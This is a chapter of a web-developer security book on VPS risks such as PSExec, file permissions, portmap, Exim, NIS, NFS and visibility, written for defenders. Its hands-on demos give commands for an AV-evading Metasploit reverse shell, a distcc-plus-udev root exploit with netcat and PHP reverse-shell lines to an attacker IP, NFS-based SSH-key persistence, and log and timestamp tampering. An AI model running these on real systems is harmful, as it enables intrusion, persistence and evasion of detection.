# 7. VPS {#vps}

![10,000' view of VPS Security](images/10000VPS.png)

If it makes sense, I usually advocate bringing VPS(s) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have more control. Most of my work around VPS's are with GNU/Linux instances. Most of the testing in this chapter was performed on Debian instances, usually, but not allways, web servers. Unless stated otherwise, the following applies to these type of instances.

## 1. SSM Asset Identification {#vps-asset-identification}
Take results from higher level Asset Identification found in the 30,000' View chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

* Ownership. At first this may sound strange, but that is because of an assumption you may have that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. Possibly it is just for kicks, possibly it is for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your it as a liability. Both may be correct. In any case, you need to protect your server(s) and in many cases take it to school and teach it how to protect itself. This is covered under the [SSM Countermeasures](#vps-countermeasures) section with items such as HIDS and Logging and Alerting.
* Visibility into and of many things, such as:
  * Disk space
  * Disk IO
  * CPU usage
  * Memory usage
  * File integrity and time stamp changes
  * Which system processes are running
  * System process health and responsiveness
  * Current login sessions, and failed attempts
  * What any user is doing on the system currently
  * Network connections
  * Etc
* Taking the confidential business and client information from the "Starting with the 30,000' view" chapter, here we can concretise these concepts into forms such as:
  * Email, Web, Data-store servers and of course the data on them.
  * You could even stretch this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the Mobile chapter of [Fascicle 2](https://leanpub.com/holistic-infosec-for-web-developers-fascicle2-mobile-iot))

This is probably an incomplete list for your domain. I have given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.

## 2. SSM Identify Risks
Go through same process as we did at the top level in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers), but for your VPS(s).

* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Windows specific, but does offer some insight into technology agnostic risks and countermeasures.
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-identify-risks-forfeit-control-thus-security}
![](images/ThreatTags/average-widespread-average-severe.png)

In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).

* If you do not own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you are given".
* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It is very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
* What control do you have that if you are data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you will not know about it.
* Your provider may go out of business and you may get little notice of this.
* Providers are outsourcing their outsourced services to several providers deep. They do not even have visibility themselves. Control is lost.
* \> distribution = > attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
* Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?

### Windows

#### PSExec {#vps-identify-risks-psexec}
![](images/ThreatTags/average-common-difficult-severe.png)

PSExec was written by Mark Russinovich as part of the Sysinternals tool suite. PSExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a telnet replacement.  
PSExec requires a few things on the target system:

1. The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)
2. File and Print Sharing must be enabled
3. Simple File Sharing must be disabled
4. The Admin$ share (which maps to the Windows directory) must be available and accessible
5. The credentials supplied to the PSExec utility must have permissions to access the Admin$ share

The PSExec executable has a Windows Service image inside which it deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PSExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.

The Metasploit PSExec module (`exploit/windows/smb/psexec`) uses basically the same principle.

{#wdcnz-demo-5}
![](images/HandsOnHack.png)

The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) of that series will provide some additional context and it is probably best to look at it first if you have not already.

You can find the video of how it is played out at [http://youtu.be/1EvwwYiMrV4](http://youtu.be/1EvwwYiMrV4).

I> ## Synopsis
I>
I> This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.  
I> We open a reverse shell from the victim to us using Metasploit.  
I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
I> With this attack you will have had to have obtained the targets username and password or password hash.  
I> We leverage PSExec which expects your binary to be a windows service.
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start Veil-Evasion:  
G> `cd /opt/Veil/Veil-Evasion/ && ./Veil-Evasion.py`
G>
G> List the available payloads to encrypt:  
G> `list`
G>
G> Choose a service because we are going to use psexec to install it on the targets box and we want to open a reverse shell:  
G> `use 4`  
G> That is `c/meterpreter/rev_http_service`
G>
G> Set any options here:  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G>
G> Generate the initial payload:  
G> `generate`
G>
G> Give it a name. I just selected the default of "payload".  
G> [Enter]  
G> Exit out of Veil-Evasion.
G>
G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:  
G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
G> We then put the encrypted payload somewhere where Metasploit can access it:  
G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
G> We then tell Metasploit where we have put it.  
G> I created a Metasploit resource file:  
G> `cat ~/demo.rc`
G>
G> `use exploit/windows/smb/psexec`  
G> `set payload windows/meterpreter/reverse_http`  
G> `set lport 8080`  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G> `set rhost <IP address of target>`  
G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
G> `set smbuser <target username>`  
G> `set smbpass <target password>`  
G> `run`
G>
G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.

{icon=bomb}
G> Now we have got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
G>
G> We now run msfconsole with the resource file as parameter:  
G> `msfconsole -r ~/demo.rc`  
G> and that is enough to evade AV and get our reverse shell.
G>
G> `sessions` will show you the active sessions you have.  
G> To interact with the first one:  
G> `sessions -i 1`
G>
G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.

### Unnecessary and Vulnerable Services 

#### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}

A lack of segmenting of a file system, according to what is the least amount of privilege any authorised parties require is often the precursor to **privilege escalation**.

Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files whether they be binaries or scripts.

When an executable (usually run as a daemon) is called by one of these privileged services and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable if they think it will go unnoticed.

If we take the path of least resistance when setting up our partitions on installation by combining file system resources that have lesser requirements for higher privileges, together with those that have greater requirements, then we are not applying the principle of least privilege. What this means is that some resources that do not need the extra privileges in order to do their job, get given them anyway. This allows attackers to take advantage of this, by swapping in (writing) and executing malicious files, directly or indirectly.

If the target file that an attacker wants to swap for a trojanised version is world writeable, user writeable or even group writeable, and they are that user or in the specified group, then they will be able to swap the file... Unless the mounted file system is restrictive enough to mitigate the action.

{#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations}
1. The first risk is at the file permission and ownership level
    1. The first tool we can pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which has its source code on [github](https://github.com/pentestmonkey/unix-privesc-check) and is also shipped with Kali Linux, but only the 1.x version (`unix-privesc-check` single file), which is fine, but the later version which sits on the master branch (`upc.sh` main file plus many sub files) does a lot more, so it can be good to use both. You just need to get the shell file(s) from either the `1_x` or `master` branch onto your target machine and run. Running as root allows the testing to be a lot more thorough for obvious reasons. If I'm testing my own host, I will start with the `upc.sh`, I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply looking at the main file will give you a good idea of the options, or you can just run:  
    `./upc.sh -h`  
        
        
        To run:  
        `# Produces a reasonably nice output`  
        `./upc.sh > upc.output`  
        
        
    2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.
2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
    1. The first and easiest command to run is:  
    `mount`  
    This will show you the options that all of your file systems were mounted with. In the Countermeasures we address how to improve the permissiveness of these mounted file systems.
    2. For peace of mind, I usually like to test that the options that our file systems appear to be mounted with actually are. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab` and attempt to run it, it should fail.
    3. You can try writing any file to the file systems that have the `ro` (read-only) option specified against them in the `/etc/fstab`, that should also fail.
    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being respected. If for example we have an executable that has its `suid` bit set, any other logged in user temporarily inherits the file owners permissions as well as the UID and GID to run that file, rather than their own permissions.

Running a directory listing that has a file with its `suid` bit set will produce a permission string similar to `-rwsr--r--`  
The `s` is in the place of the owners executable bit. If instead a capitol `S` is used, it means that the file is not executable

All `suid` files can be found with the following command:  
`find / -perm -4000 -type f 2>/dev/null`

All `suid` files owned by root can be found with the following command:  
`find / -uid 0 -perm -4000 -type f 2>/dev/null`

To add the `suid` bit, you can do so the symbolic way or numeric.

symbolic:  
`chmod u+s <yourfile>`

numeric:  
`chmod 4750 <yourfile>`

This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not go setting the `suid` bits on files unless you fully understand what you are doing, and have good reason to. This could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable or the fact that the file can be modified/replaced.

So for example if root owns a file and the file has its `suid` bit set, anyone can run that file as root.

![](images/HandsOnHack.png)

We will now walk through the steps of how an attacker may carry out a privilege escalation.

You can find the video of how it is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).

I> ## Synopsis
I>
I> First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.  
I> We find a suitable open port with a defective service listening, that is our Vulnerability Scanning / Discovery stage.  
I> We then search for an exploit that may be effective at giving us at least low privilege access to the machine.  
I> We then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.  
I> We then search for exploits that may help us escalate our privileges, based on an area in the file system that we now know we have write and execute permissions on.  
I> We then walk through understanding a chosen exploit and preparing it to be run.

{icon=bomb}
G> ## The Play
G>
G> A simple nmap scan will show us any open ports.  
G> One of the ports is 3632, with the `distcc` (distributed compiler, useful for speeding up source code compilation) daemon listening.  
G>
G> Let us check to see if Metasploit knows about any `distcc` exploits?
G>
G> 
G> `msfconsole`  
G> `msf > db_rebuild_cache`  
G> `msf > search distcc`  
G> `msf > use exploit/unix/misc/distcc_exec`  
G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
G> `msf exploit(distcc_exec) > exploit`  
G> In the video metasploitable was running at 192.168.56.21 for starters. After this I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
G>
G> Now we have a shell. Let us test it.
G>
G> `pwd`  
G> `/tmp`  
G> `whoami`  
G> `daemon`  
G>
G> All following commands can be run through our low privilege user.
G>
G> Running `unix-privesc-check` and directing the output to a file shows us:  
G> `I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)`
G>
G> What about a file system that is mounted with permissions that will allow us to write a file that may be executed by one of the previously mentioned privileged services?  
G>
G> `mount`  
G> Shows us that we have very little in the way of granular partitioning and we have `/` mounted as `rw`, so as a low privileged user, we can both write and execute files in `/tmp` for example.  
G>
G> We could also just search for "Privilege Escalation" exploits targeting our targets kernel.  
G> Let us get the targets Kernel version: `uname -a` produces:  
G> `2.6.24`
G>
G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:  
G> `dpkg -l gcc`  
G> We do.

{icon=bomb}
G>
G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,  
G> which allowed users to supply their own, which we see in the exploit:  
G> `sendmsg(sock, &msg, 0);`
G>
G> The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.  
G> We need to pass the PID of the netlink socket as an argument.  
G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
G>
G> Through our daemon shell that `distcc_exec` provided, let us fetch the exploit:  
G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
G> The `no-check` is required because metasploitable does not have the relevant CA cert installed.  
G> Now check that the file has the contents that you expect.  
G> `cat privesc.c`
G>
G> Let us compile it:  
G> `gcc privesc.c -o privesc`  
G> `ls -liah`  
G> `privesc`
G>
G> Now we need the PID of the udevd netlink socket  
G> `cat /proc/net/netlink`  
G> Gives us `2299`  
G> And to check:  
G> `ps -aux | grep udev`  
G> Gives us `2300` which should be one more than netlink.
G>
G> Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
G> Open a connection to 192.168.0.12:1234, then run `/bin/bash`  
G> `echo '#!/bin/bash' > run`  
G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
G> Another alternative is using php  
G> `echo '#!/bin/bash' > run`  
G> `echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" >> run`  
G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.

{icon=bomb}
G>
G> On the attacking side:  
G> `nc -lvp 1234`  
G> `Listening on [any] 1234 ...`
G>
G> Now from our low privilege shell, user supplies message from user space (seen within the exploit) along with the PID of netlink:  
G> `./privesc 2299`
G>
G> You should see movement on the listening netcat now.  
G> `connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542`  
G> `whoami`  
G> `root`
G>
G> and that is our privilege escalation, we now have root.

The Countermeasures sections that address are:

1. [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)
2. [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions), which also briefly touches on the improving file permissions and ownership

#### Weak Password Strategies

This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition to that, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.

#### Root Logins

Allowing root logins is a lost opportunity for another layer of defence in depth, where the user must elevate privilages before performaning any task that could possibly negativly impact the system. Once an attacker is root on a system, the system is owned by them. Root is a user and no guess work is required for that username. Other low privilaged users require some guess work on the part of the username as well as the password, and even once both parts of a low privaleged credential have been aquired, there is another step to total system ownership.

#### SSH
![](images/ThreatTags/difficult-uncommon-average-moderate.png)

You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). SSH in itself has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using the default of password authentication and have not configured which remote hosts can or can not access the server, and chose to use a weak password, then your SSH security is only as strong as the password. There are many configurations that a default install of SSH uses in order to get up and running quickly, that need to be modified in order to harden SSH. Using SSH in this manner can be convienient initially, but it is always recommended to move from the defaults to a more secure model of usage. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.

#### To Many Boot Options

Being able to boot from alternative media to that of your standard OS, provides additional opportunity for an attacker to install a root-kit on your machine, whether it be virtual or real media.

#### Portmap {#vps-identify-risks-unnecessary-and-vulnerable-services-portmap}

An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host, where the target host is an IP address or a host name.

If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the depricated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a collection of attacks. 

{title="rpcinfo", linenos=off, lang=bash}
    rpcinfo -p <target host> 

{title="rpcinfo results for Metasploitable2", linenos=off, lang=bash}
    program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100000    4     7    111  portmapper
    100000    3     7    111  portmapper
    100000    2     7    111  portmapper
    100005    1   udp    649  mountd
    100003    2   udp   2049  nfs
    100005    3   udp    649  mountd
    100003    3   udp   2049  nfs
    100024    1   udp    600  status
    100005    1   tcp    649  mountd
    100024    1   tcp    868  status
    100005    3   tcp    649  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100021    0   udp    679  nlockmgr
    100021    0   tcp    875  nlockmgr
    100021    1   udp    679  nlockmgr
    100021    1   tcp    875  nlockmgr
    100021    3   udp    679  nlockmgr
    100021    3   tcp    875  nlockmgr
    100021    4   udp    679  nlockmgr
    100021    4   tcp    875  nlockmgr

This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to take into the Vulnerability Searching stage discussed in the Process and Practises chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers).

The deprecated `portmap` service as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.

Besides providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks, in fact that is why. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.

These types of attacks have become very popular amongst distributed attackers due to their significant impact, lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack and how it has become very popular since the beginning of August 2015.  
US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A) on UDP-Based Amplification Attacks outlining the Protocols, Bandwidth Amplification Factor, etc.

{title="rpcinfo", linenos=off, lang=bash, id=vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t}
    rpcinfo -T udp <target host> 

{title="rpcinfo results for Metasploitable2", linenos=off, lang=bash}
    program version netid     address                service    owner
    100000    2    tcp       0.0.0.0.0.111          portmapper unknown
    100024    1    udp       0.0.0.0.130.255        status     unknown
    100024    1    tcp       0.0.0.0.138.110        status     unknown
    100003    2    udp       0.0.0.0.8.1            nfs        unknown
    100003    3    udp       0.0.0.0.8.1            nfs        unknown
    100003    4    udp       0.0.0.0.8.1            nfs        unknown
    100021    1    udp       0.0.0.0.167.198        nlockmgr   unknown
    100021    3    udp       0.0.0.0.167.198        nlockmgr   unknown
    100021    4    udp       0.0.0.0.167.198        nlockmgr   unknown
    100003    2    tcp       0.0.0.0.8.1            nfs        unknown
    100003    3    tcp       0.0.0.0.8.1            nfs        unknown
    100003    4    tcp       0.0.0.0.8.1            nfs        unknown
    100021    1    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100021    3    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100021    4    tcp       0.0.0.0.151.235        nlockmgr   unknown
    100005    1    udp       0.0.0.0.235.25         mountd     unknown
    100005    1    tcp       0.0.0.0.182.4          mountd     unknown
    100005    2    udp       0.0.0.0.235.25         mountd     unknown
    100005    2    tcp       0.0.0.0.182.4          mountd     unknown
    100005    3    udp       0.0.0.0.235.25         mountd     unknown
    100005    3    tcp       0.0.0.0.182.4          mountd     unknown
    100000    2    udp       0.0.0.0.0.111          portmapper unknown

You will notice in the response as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:

{title="wireshark results", linenos=off, lang=bash}
    Source      Destination Protocol Length Info
    <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
    <dest IP>   <source IP> Portmap  726    V3 DUMP Reply (Call In 75)

The packet capture in Wireshark which is not showen here also confirms that it is UDP.

#### EXIM

Exim, along with offerings such as Postfix, Sendmail, Qmail, etc, are Mail Transfer Agents (MTAs), which on a web server are probably not required.

There have been plenty of exploits created for Exim security defects. Most of the defects I have seen have patches for, so if Exim is a necessity, stay up to date with your patching. If you are still on a stable (jessie at the time of writing) and can not update to a testing release, make sure to use backports.

At the time of writing this, the very front page of the [Exim website](www.exim.org) states "All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release.".

Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87,  
which 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). Now if we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)) and dissect it a little:

The Perl shell environment variable `$PERL5OPT` can be assigned  options, these options will be interpreted as if they were on the `#!` line at the beginning of the script. These options will be treated as part of the command run, after any optional switches included on the command line are accepted. 

`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, so with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line like the following, which runs the script as root:

`#!perl -Mroot` 

The Perl shell environment variable `$PERL5LIB` is used to specify a colon (or semicolon on Windows) separated list of directories in which to look for Perl library files before looking in the standard library and the current directory.

Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run, means the first place execution will look for the root module is in the `/tmp` directory.

#### NIS

**Some History**:

NIS+ was introduced as part of Solaris 2 in 1992 with the intention that it would eventually replace NIS, originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).

**What NIS is**:

NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many machines in a network share a common set of configuration files with the same account information, such as the commonly local stored UNIX:

* users
* their groups
* hostnames
* e-mail aliases
* etc
* and contents of the `/etc/passwd` and referenced `/etc/shadow` which contains the hashed passwords, discussed in detail under the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section

The NIS master server maintains canonical database files called maps. We also have slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.

**Vulnerabilities and exploits**:

NIS has had its day, it is vulnerable to many exploits, such as DoS attacks using the finger service against multiple clients, buffer overflows in libnasl, 

"_lax authentication while querying of NIS maps (easy for a compromised client to take advantage of), as well as the various daemons each having their own individual issues. Not to mention that misconfiguration of NIS or netgroups can also provide easy holes that can be exploited. NIS databases can also be easily accessed by someone who doesn't belong on your network. How? They simply can guess the name of your NIS domain, bind their client to that domain, and run a ypcat command to get the information they are after._"

> [Symantec - nfs and nis security](https://www.symantec.com/connect/articles/nfs-and-nis-security)

NIS can run on unprivileged ports, which means that any user on the system(s) can run them. If a replacement version of these daemons was put in place of the original, then the attacker would have access to the resources that the daemons control.

#### Rpcbind

`rpcbind` listens on the same port(s) as the deprecated [`portmap`](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap) and suffers the same types of DoS attacks.

#### Telnet



Created and launched in 1969.







#### FTP

_Todo_

#### NFS

`mountd` or `rpc.mount` is the NFS mount daemon, that listens and services NFS client requests to mount a file system.

If mounts are listed in the `/etc/fstab`, attempts will be made to mount them on system boot.

If the `mountd` daemon is listed in the output of the above `rpcinfo` command, the `showmount -e` command will be useful for listing the NFS servers list of exports defined in the servers `/etc/exports` file.

{title="showmount", linenos=off, lang=bash}
    showmount -e <target host>

{title="showmount results", linenos=off, lang=bash}
    Export list for <target hsot>:
    / (anonymous) # If you're lucky as an attacker, anonymous means anyone can mount.
    / * # means all can mount the exported root directory.
    # Probably because the hosts.allow has ALL:ALL and hosts.deny is blank.
    # Which means all hosts from all domains are permitted access.

NFS is one of those protocols that you need to have some understanding on in order to achieve a level of security sufficient for your target environment. NFS provides no user authentication, only host based authentication. NFS relies on the AUTH_UNIX method of authentication, the user ID (UID) and group ID (GIDs) that the NFS client passes to the server are implicitly trusted.

{title="mount nfs export", linenos=off, lang=bash}
    # Make sure local rpcbind service is running:
    service rpcbind status
    # Should yield [ ok ] rpcbind is running.
    # If not:
    service rpcbind start
    mount -t nfs <target host>:/ /mnt

All going well for the attacker, they will now have your VPS's `/` directory mounted to their `/mnt` directory. If you have not setup NFS properly, they will have full access to your entire file system.

To establish some persistence, an attacker may be able to add their SSH public key:

{linenos=off, lang=bash}
    cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys

The NFS daemon always listens on the unprivileged port 2049. An attacker without root privileges on a system can start a trojanised `nfsd` which will be bound to port 2049, on a system that does not usually offer NFS, or if they can find a way to stop an existing `nfsd` and run their own, clients may communicate with the trojanised `nfsd` and possibly consume exports containing malicious mocked ([pickled](https://github.com/micheloosterhof/cowrie/blob/master/data/fs.pickle)) file systems without being aware of it. By replacing a NFS daemon with a trojanised replica, the attacker would also have access to the resources that the legitimate daemon controls.

The ports that a Linux server will bind its daemons to are listed in `/etc/services`.

As well as various privilege escalation vulnerabilities, NFS has also suffered from various buffer overflow vulnerabilities.

### Lack of Visibility {#vps-identify-risks-lack-of-visibility}

As I was writing this section, I realised that visibility is actually an asset, so I went back and added it... actually to several chapters. Without visibility, an attacker can do a lot more damage than they could if you were watching them and able to react, or even if you have good auditing capabilities. It is in fact an asset that attackers often try and remove for this very reason.

Any attacker worth their weight will try to [cover their tracks](https://www.win.tue.nl/~aeb/linux/hh/hh-13.html) as they progress. Once an attacker has shell access to a system, they may:

* Check running processes to make sure that they have not left anything they used to enter still running
* Remove messages in logs related to their break (walk) in
* Same with the shell history file. Or even:  
  `ln /dev/null ~/.bash_history -sf` so that all following history vanishes.
* They may change time stamps on new files with:  
  `touch -r <referenceFile> <fileThatGetsReferenceFileTimeStampsApplied>`  
  Or better is to use the original date-time:

    {linenos=off}
        touch -r <originalFile> <trojanFile>
        mv <trojanFile> <originalFile>

* Make sure any trojan files they drop are the same size as the originals
* Replace `md5sum` so that it contains sums for the files that were replaced including itself. Although if an administrator ran `rpm -V` or `debsums -c` (Debian, Ubuntu) it would not be affected by a modified `md5sum`.

If an attacker wants their actions to be invisible, they may try replacing the likes of `ps`, `pstree`, `top` and possibly `netstat` or `ss` if they are trying to hide network activity from the host.

Taking things further, an attacker may load a kernel module that modifies the `readdir()` call and the `proc` filesystem so that any changes on the file system are untrustworthy, or if going to the length of loading custom modules, everything can be done from kernel space which is invisible until reboot.

Without visibility, an attacker can access your system(s) and, alter, [copy](https://github.com/m57/dnsteal), modify information without you knowing they did it. Even launch DoS attacks without you noticing anything before it is to late.

### Docker

Docker security is similar to VPS security, except there is a much larger attack surface, and by default provides little extra in terms of security, as touched on in the "Process and Practises" chapter of Fascicle 0. Yes some parts are inside a container, but the defaults for containment are established to help devops get up and running fast, not to be secure by default, in fact the defaults are in most cases insecure by default. Docker has many security enhancing capabilities, [but none are on by default](http://resources.infosecinstitute.com/docker-and-enterprise-security-establishing-best-practices/)

When you start to look closely at how much attack surface is introduced, what docker provides is bitter sweet. Docker has stood on the shoulders of giants and brought huge productivity gains up front. Consumers seem to be missing the fact of the increased costs that will have to be paid either before their systems are exploited, by hardening many aspects of Docker, or more likely, upon the fallout of the successful attacks on the increased surface area that Docker containers provide.

#### Consuming community provided images

